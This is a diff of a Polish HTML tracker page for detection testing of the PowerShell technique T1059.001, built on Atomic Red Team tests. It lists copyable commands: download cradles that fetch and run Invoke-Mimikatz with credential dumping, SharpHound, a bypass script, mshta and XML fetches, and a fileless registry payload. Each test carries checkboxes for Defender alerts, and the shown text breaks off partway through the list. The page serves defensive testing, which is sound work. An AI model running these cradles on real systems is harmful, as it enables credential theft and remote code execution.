@@ -2,53 +2,773 @@
 <html lang="pl">
 <head>
   <meta charset="UTF-8">
-  <title>Alert: PowerShell</title>
+  <title>Alert: PowerShell – Atomic Red Team</title>
   <style>
     body { font-family: Segoe UI, Arial, sans-serif; margin: 2rem; background: #f6f7fb; }
-    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 700px; margin: auto; }
+    .card { background: #fff; border-radius: 10px; box-shadow: 0 2px 6px #bbb; padding: 2rem; max-width: 800px; margin: auto; }
     h1 { margin-top: 0; font-size: 2rem; }
     .desc, .id, .link, .author, .tactic, .status { margin-bottom: 1.1em; }
     .meta { font-size: .95em; color: #555; margin-bottom: .8em; }
     .section { font-size: .99em; }
     .scenario-block { background: #f4f0d9; border-radius: 7px; padding: 1em 1.2em; margin-bottom: 1.2em; color:#4a4500; font-size:1.07em; border-left:5px solid #e1c553; }
-    pre { background: #eee; padding: .7em 1em; border-radius: 5px; }
+    pre { background: #eee; padding: .7em 1em; border-radius: 5px; white-space: pre-wrap; word-break: break-all; overflow-x: auto; max-width: 100%; }
     code { background: #f6f6f6; padding: 2px 5px; border-radius: 2px; }
     ul { margin-left: 1.6em; }
+    textarea { width:100%; border-radius:8px; border:1.5px solid #d6d6d6; font-size:1.08em; margin-top:8px; padding:8px; background:#faf8ed;}
+    .badge-ok { background: #43a047; color: #fff; }
+    .art-accordion { margin-bottom:10px; }
+    .art-accordion-btn { background:#eaf4ff; color:#1d3557; cursor:pointer; padding:9px 18px; width:100%; text-align:left; border:none; border-radius:7px; font-size:1.1em; font-weight:600; margin-bottom:2px; transition:background 0.18s;}
+    .art-accordion-btn:hover { background:#ddefff; }
+    .art-accordion-content { display:none; background:#f7fafd; border:1px solid #e3e3e3; border-radius:0 0 7px 7px; padding:13px 18px; margin-bottom:2px; }
+    .test-cleanup { background:#fffde7; border-left:4px solid #ffd700; margin-top:11px; padding:7px 12px; border-radius:5px; }
+    .badge { display:inline-block; border-radius:8px; padding:2px 10px; font-size:.94em; color:#fff; margin-right:7px; }
+    .badge-ps { background:#1976d2; }
+    .badge-cmd { background:#29b300; }
+    .badge-total { background:#888; }
+    .art-checklist { background: #f7fff7; border-radius:6px; margin-top:10px; padding:7px 15px; }
+    .art-checklist label { font-size:1.02em; margin-right:20px; }
+    .art-checklist input[type=checkbox] { transform: scale(1.2); margin-right:8px; }
+    .art-copy-btn { background:#fff; border:1px solid #bdbdbd; color:#1976d2; border-radius:6px; padding:3px 11px; margin-left:8px; font-size:0.97em; cursor:pointer;}
+    .art-copy-btn:active { background:#eaf4ff;}
+    .eksport-btn { background:#c5e1a5; color:#1b4b2b; border-radius:7px; border:none; padding:9px 17px; margin:11px 0 5px 0; font-weight:600; cursor:pointer; }
+    .eksport-btn:hover { background:#b2dfdb; }
+    .import-btn { background:#bbdefb; color:#1a237e; border-radius:7px; border:none; padding:8px 15px; margin-left:8px; font-weight:600; cursor:pointer; }
+    .import-btn:hover { background:#90caf9; }
   </style>
+  <script>
+    function toggleArtAccordion(btn) {
+      var content = btn.nextElementSibling;
+      content.style.display = (content.style.display === "block") ? "none" : "block";
+    }
+    function copyArtCode(btn) {
+      var code = btn.previousElementSibling.textContent;
+      navigator.clipboard.writeText(code);
+      btn.textContent = "Skopiowano!";
+      setTimeout(()=>btn.textContent="Kopiuj", 1100);
+    }
+    function saveChecklist(tid, id, scenarioBlockId, testLabel) {
+      var uniqueId = tid + '-' + id;
+      var div = document.getElementById('checklist-' + uniqueId);
+      var chks = div.querySelectorAll('input[type=checkbox]');
+      var states = Array.from(chks).map(x => x.checked);
+      localStorage.setItem('art-checklist-' + uniqueId, JSON.stringify(states));
+      var allChecked = states.every(x=>x);
+      document.getElementById('tested-badge-' + uniqueId).style.display = allChecked ? 'inline-block' : 'none';
+      if(allChecked && scenarioBlockId && testLabel) {
+        var now = new Date().toLocaleString("pl-PL");
+        var msg = `✅ [${now}] Przetestowano: ${testLabel} – utworzono alert w Defenderze`;
+        var scenario = document.getElementById(scenarioBlockId);
+        if(scenario && !scenario.value.includes(msg)) {
+          scenario.value += "\n" + msg;
+        }
+      }
+    }
+    function loadChecklist(tid, id, scenarioBlockId, testLabel) {
+      var uniqueId = tid + '-' + id;
+      var div = document.getElementById('checklist-' + uniqueId);
+      if (!div) return;
+      var chks = div.querySelectorAll('input[type=checkbox]');
+      var states = JSON.parse(localStorage.getItem('art-checklist-' + uniqueId) || '[]');
+      chks.forEach((chk, i) => { chk.checked = !!states[i]; });
+      var allChecked = states.length && states.every(x=>x);
+      document.getElementById('tested-badge-' + uniqueId).style.display = allChecked ? 'inline-block' : 'none';
+      if(allChecked && scenarioBlockId && testLabel) {
+        var now = new Date().toLocaleString("pl-PL");
+        var msg = `✅ [${now}] Przetestowano: ${testLabel} – utworzono alert w Defenderze`;
+        var scenario = document.getElementById(scenarioBlockId);
+        if(scenario && !scenario.value.includes(msg)) {
+          scenario.value += "\n" + msg;
+        }
+      }
+    }
+    function resetChecklist(tid, id, scenarioBlockId, testLabel) {
+      var uniqueId = tid + '-' + id;
+      localStorage.removeItem('art-checklist-' + uniqueId);
+      loadChecklist(tid, id, scenarioBlockId, testLabel);
+    }
+    function eksportujProgres(tid, total_tests) {
+      let out = [];
+      for(let i=1; i<=total_tests; i++) {
+        let id = 'art' + String(i).padStart(2,'0');
+        let uniqueId = tid + '-' + id;
+        let div = document.getElementById('checklist-' + uniqueId);
+        if(!div) continue;
+        let label = div.getAttribute('data-label') || ("Atomic Test " + i);
+        let chks = div.querySelectorAll('input[type=checkbox]');
+        let states = Array.from(chks).map(x => x.checked);
+        if(states.every(x=>x)) {
+          let now = new Date().toLocaleString("pl-PL");
+          out.push(`✅ [${now}] Przetestowano: ${label} – utworzono alert w Defenderze`);
+        }
+      }
+      let box = document.getElementById('eksportChecklist');
+      box.style.display = 'block';
+      box.value = out.join("\n");
+      box.select();
+      document.execCommand('copy');
+    }
+    function pokazImport() {
+      var el = document.getElementById('importBox');
+      el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+    }
+    function importujProgres() {
+      var lines = document.getElementById('importProgress').value.split('\n');
+      var tid = document.body.getAttribute('data-tid');
+      var total_tests = Number(document.body.getAttribute('data-total-tests')||'1');
+      for(let i=1; i<=total_tests; i++) {
+        let id = 'art' + String(i).padStart(2,'0');
+        let label = "";
+        let div = document.getElementById('checklist-' + tid + '-' + id);
+        if(!div) continue;
+        label = div.getAttribute('data-label') || ("Atomic Test " + i);
+        let ok = lines.some(line => line.includes(label));
+        if(ok) {
+          let chks = div.querySelectorAll('input[type=checkbox]');
+          let states = Array(chks.length).fill(true);
+          chks.forEach((chk, idx) => { chk.checked = true; });
+          localStorage.setItem('art-checklist-' + tid + '-' + id, JSON.stringify(states));
+          document.getElementById('tested-badge-' + tid + '-' + id).style.display = 'inline-block';
+        }
+      }
+      alert('Przywrócono progres!');
+      location.reload();
+    }
+    window.addEventListener('DOMContentLoaded', function() {
+      var tid = document.body.getAttribute('data-tid');
+      var total_tests = Number(document.body.getAttribute('data-total-tests')||'1');
+      for(let i=1; i<=total_tests; i++) {
+        let id = 'art' + String(i).padStart(2,'0');
+        let div = document.getElementById('checklist-' + tid + '-' + id);
+        if(!div) continue;
+        let scenarioBlockId = div.getAttribute('data-scenario');
+        let testLabel = div.getAttribute('data-label');
+        loadChecklist(tid, id, scenarioBlockId, testLabel);
+        div.querySelectorAll('input[type=checkbox]').forEach(function(chk) {
+          chk.onchange = function() { saveChecklist(tid, id, scenarioBlockId, testLabel); };
+        });
+      }
+    });
+  </script>
 </head>
-<body>
+<body data-tid="T1059.001" data-total-tests="22">
 <div class="card">
   <h1>Alert: PowerShell</h1>
-  <div class="meta"><b>Technique ID:</b> T1059.001<div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'><b>Atomic Red Team – dostępne testy dla tej techniki:</b><ul><li><b>Mimikatz</b><br><b>Polecenia testowe (cmd):</b><pre>powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"</pre><a href='../../scenarios/atomic_tests\T1059.001\Mimikatz/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Run BloodHound from local disk</b><br><b>Polecenia testowe (powershell):</b><pre>import-module "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+  <div class="meta"><b>Technique ID:</b> T1059.001</div>
+  <div class="tactic section"><b>Tactics:</b> Execution</div>
+  <div class="status section"><b>Status:</b> ART / do walidacji</div>
+  <div class="desc section"><b>MITRE Description:</b><br>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the &lt;code&gt;Start-Process&lt;/code&gt; cmdlet which can be used to run an executable and the &lt;code&gt;Invoke-Command&lt;/code&gt; cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).  PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)  PowerShell commands/scripts can also be executed without directly invoking the &lt;code&gt;powershell.exe&lt;/code&gt; binary through interfaces to PowerShell's underlying &lt;code&gt;System.Management.Automation&lt;/code&gt; assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)</div>
+  <div class="link section"><b>MITRE Link:</b> <a href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">https://attack.mitre.org/techniques/T1059/001/</a></div>
+  <div class="scenario-block">
+    <b>Twój opis scenariusza:</b><br>
+    <textarea id="scenarioBlock" rows="7" readonly>
+Tutaj wpisz opis scenariusza lub eksportuj progres z checklisty poniżej.
+    </textarea>
+  </div>
+  <button onclick="eksportujProgres('T1059.001',22)" class="eksport-btn">Eksportuj progres (do MD)</button>
+  <button onclick="pokazImport()" class="import-btn">Załaduj progres z .md</button>
+  <div id="importBox" style="display:none;margin-top:8px;">
+    <textarea id="importProgress" rows="4" style="width:99%;"></textarea>
+    <button onclick="importujProgres()" class="import-btn">Zastosuj progres</button>
+  </div>
+  <textarea id="eksportChecklist" rows="4" style="width:100%;margin-top:10px;display:none;"></textarea>
+  <div style='background:#eaf4ff;border-radius:8px;padding:15px 16px;margin-top:25px;'>
+    <b>Atomic Red Team – dostępne testy dla tej techniki:</b>
+    <div style="margin-bottom:10px;">
+      <span class="badge badge-total">22 testów</span>
+      <span class="badge badge-ps">15 PowerShell</span>
+      <span class="badge badge-cmd">6 CMD</span>
+      <a href='https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.001' target='_blank' style="float:right;">Zobacz na GitHubie</a>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 1: Mimikatz</b>
+        <span id="tested-badge-T1059.001-art01" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Mimikatz\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art01" data-scenario="scenarioBlock" data-label="Atomic Test 1: Mimikatz">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art01','scenarioBlock','Atomic Test 1: Mimikatz')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 2: Run BloodHound from local disk</b>
+        <span id="tested-badge-T1059.001-art02" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>import-module &quot;PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1&quot;
 try { Invoke-BloodHound -OutputDirectory $env:Temp }
 catch { $_; exit $_.Exception.HResult}
-Start-Sleep 5</pre><a href='../../scenarios/atomic_tests\T1059.001\Run_BloodHound_from_local_disk/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Remove-Item $env:Temp\*BloodHound.zip -Force</pre><a href='../../scenarios/atomic_tests\T1059.001\Run_BloodHound_from_local_disk/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>Run Bloodhound from Memory using Download Cradle</b><br><b>Polecenia testowe (powershell):</b><pre>write-host "Remote download of SharpHound.ps1 into memory, followed by execution of the script" -ForegroundColor Cyan
+Start-Sleep 5</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Run_BloodHound_from_local_disk\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="test-cleanup">
+          <b>Cleanup (powershell):</b>
+          <pre>Remove-Item $env:Temp\*BloodHound.zip -Force</pre>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Run_BloodHound_from_local_disk\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art02" data-scenario="scenarioBlock" data-label="Atomic Test 2: Run BloodHound from local disk">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art02','scenarioBlock','Atomic Test 2: Run BloodHound from local disk')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 3: Run Bloodhound from Memory using Download Cradle</b>
+        <span id="tested-badge-T1059.001-art03" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>write-host &quot;Remote download of SharpHound.ps1 into memory, followed by execution of the script&quot; -ForegroundColor Cyan
 IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');
 Invoke-BloodHound -OutputDirectory $env:Temp
-Start-Sleep 5</pre><a href='../../scenarios/atomic_tests\T1059.001\Run_Bloodhound_from_Memory_using_Downloa/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Remove-Item $env:Temp\*BloodHound.zip -Force</pre><a href='../../scenarios/atomic_tests\T1059.001\Run_Bloodhound_from_Memory_using_Downloa/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>Mimikatz - Cradlecraft PsSendKeys</b><br><b>Polecenia testowe (powershell):</b><pre>$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr</pre><a href='../../scenarios/atomic_tests\T1059.001\Mimikatz_-_Cradlecraft_PsSendKeys/test_1.ps1'>Pobierz test_1.ps1</a><br></li><li><b>Invoke-AppPathBypass</b><br><b>Polecenia testowe (cmd):</b><pre>Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"</pre><a href='../../scenarios/atomic_tests\T1059.001\Invoke-AppPathBypass/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Powershell MsXml COM object - with prompt</b><br><b>Polecenia testowe (cmd):</b><pre>powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"</pre><a href='../../scenarios/atomic_tests\T1059.001\Powershell_MsXml_COM_object_-_with_promp/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Powershell XML requests</b><br><b>Polecenia testowe (cmd):</b><pre>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"</pre><a href='../../scenarios/atomic_tests\T1059.001\Powershell_XML_requests/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Powershell invoke mshta.exe download</b><br><b>Polecenia testowe (cmd):</b><pre>C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"</pre><a href='../../scenarios/atomic_tests\T1059.001\Powershell_invoke_mshta.exe_download/test_1.cmd'>Pobierz test_1.cmd</a><br></li><li><b>Powershell Invoke-DownloadCradle</b></li><li><b>PowerShell Fileless Script Execution</b><br><b>Polecenia testowe (powershell):</b><pre># Encoded payload in next command is the following "Set-Content -path "$env:SystemRoot/Temp/art-marker.txt" -value "Hello from the Atomic Red Team""
-reg.exe add "HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam" /v ART /t REG_SZ /d "U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=" /f
-iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Fileless_Script_Execution/test_1.ps1'>Pobierz test_1.ps1</a><br><b>Polecenia cleanup (powershell):</b><pre>Remove-Item -path C:\Windows\Temp\art-marker.txt -Force -ErrorAction Ignore
-Remove-Item HKCU:\Software\Classes\AtomicRedTeam -Force -ErrorAction Ignore</pre><a href='../../scenarios/atomic_tests\T1059.001\PowerShell_Fileless_Script_Execution/cleanup_1.ps1'>Pobierz cleanup_1.ps1</a><br></li><li><b>NTFS Alternate Data Stream Access</b><br><b>Polecenia testowe (powershell):</b><pre>Add-Content -Path #{ads_file} -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand'
+Start-Sleep 5</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Run_Bloodhound_from_Memory_using_Downloa\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="test-cleanup">
+          <b>Cleanup (powershell):</b>
+          <pre>Remove-Item $env:Temp\*BloodHound.zip -Force</pre>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Run_Bloodhound_from_Memory_using_Downloa\cleanup_1.ps1" download>Pobierz cleanup_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art03" data-scenario="scenarioBlock" data-label="Atomic Test 3: Run Bloodhound from Memory using Download Cradle">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art03','scenarioBlock','Atomic Test 3: Run Bloodhound from Memory using Download Cradle')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-ps">PowerShell</span>
+        <b>Atomic Test 4: Mimikatz - Cradlecraft PsSendKeys</b>
+        <span id="tested-badge-T1059.001-art04" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (powershell):</b>
+          <pre>$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Mimikatz_-_Cradlecraft_PsSendKeys\test_1.ps1" download>Pobierz test_1.ps1</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art04" data-scenario="scenarioBlock" data-label="Atomic Test 4: Mimikatz - Cradlecraft PsSendKeys">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art04','scenarioBlock','Atomic Test 4: Mimikatz - Cradlecraft PsSendKeys')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 5: Invoke-AppPathBypass</b>
+        <span id="tested-badge-T1059.001-art05" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>Powershell.exe &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Invoke-AppPathBypass\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art05" data-scenario="scenarioBlock" data-label="Atomic Test 5: Invoke-AppPathBypass">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art05','scenarioBlock','Atomic Test 5: Invoke-AppPathBypass')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 6: Powershell MsXml COM object - with prompt</b>
+        <span id="tested-badge-T1059.001-art06" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>powershell.exe -exec bypass -noprofile &quot;$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Powershell_MsXml_COM_object_-_with_promp\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art06" data-scenario="scenarioBlock" data-label="Atomic Test 6: Powershell MsXml COM object - with prompt">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art06','scenarioBlock','Atomic Test 6: Powershell MsXml COM object - with prompt')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
+        <b>Atomic Test 7: Powershell XML requests</b>
+        <span id="tested-badge-T1059.001-art07" class="badge badge-ok" style="display:none; float:right;">PRZETESTOWANE</span>
+      </button>
+      <div class="art-accordion-content">
+        <div class="test-desc"><b>Opis:</b> </div>
+
+        <div>
+          <b>Polecenia testowe (cmd):</b>
+          <pre>&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot; -exec bypass -noprofile &quot;$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX&quot;</pre>
+          <button class="art-copy-btn" onclick="copyArtCode(this)">Kopiuj</button>
+        </div>
+<a href="..\..\scenarios\atomic_tests\T1059.001\Powershell_XML_requests\test_1.cmd" download>Pobierz test_1.cmd</a><br>
+        <div class="art-checklist" id="checklist-T1059.001-art07" data-scenario="scenarioBlock" data-label="Atomic Test 7: Powershell XML requests">
+          <label><input type="checkbox"> Uruchomiono test</label><br>
+          <label><input type="checkbox"> Wykonano cleanup</label><br>
+          <label><input type="checkbox"> Zdarzenie widoczne w Defenderze</label><br>
+          <label><input type="checkbox"> Utworzono alert</label><br>
+          <button onclick="resetChecklist('T1059.001','art07','scenarioBlock','Atomic Test 7: Powershell XML requests')">Resetuj</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="art-accordion">
+      <button class="art-accordion-btn" onclick="toggleArtAccordion(this)">
+        <span class="badge badge-cmd">CMD</span>
